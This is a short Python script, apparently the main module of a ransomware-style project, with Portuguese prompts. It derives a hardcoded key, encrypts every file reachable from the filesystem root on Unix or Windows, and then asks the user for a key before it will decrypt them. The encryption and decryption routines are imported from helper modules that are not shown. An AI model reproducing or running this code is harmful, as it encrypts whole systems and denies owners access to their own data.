import os
import hashlib

from utils.get_key import get_key
from utils.decrypt import scan_and_decrypt
from utils.encrypt import scan_and_encrypt

def ask_for_key():
    key = get_key()

    if key is None:
        print("Chave não fornecida. A operação foi cancelada.")
        return None

    key = hashlib.sha256(key.encode()).digest()
    return key

if __name__ == "__main__":
    key = hashlib.sha256("nenhumsistemaestaasalvo".encode()).digest()

    directory = "/" if os.name != "nt" else "C:\\"
    scan_and_encrypt(directory, key)

    print(
        "Criptografia concluída. Agora, forneça a chave para descriptografar os arquivos."
    )

    decryption_key = ask_for_key()

    if decryption_key:
        print("Descriptografando arquivos...")
        scan_and_decrypt(directory, decryption_key)
    else:
        print("Nenhuma chave fornecida. Descriptografia não realizada.")
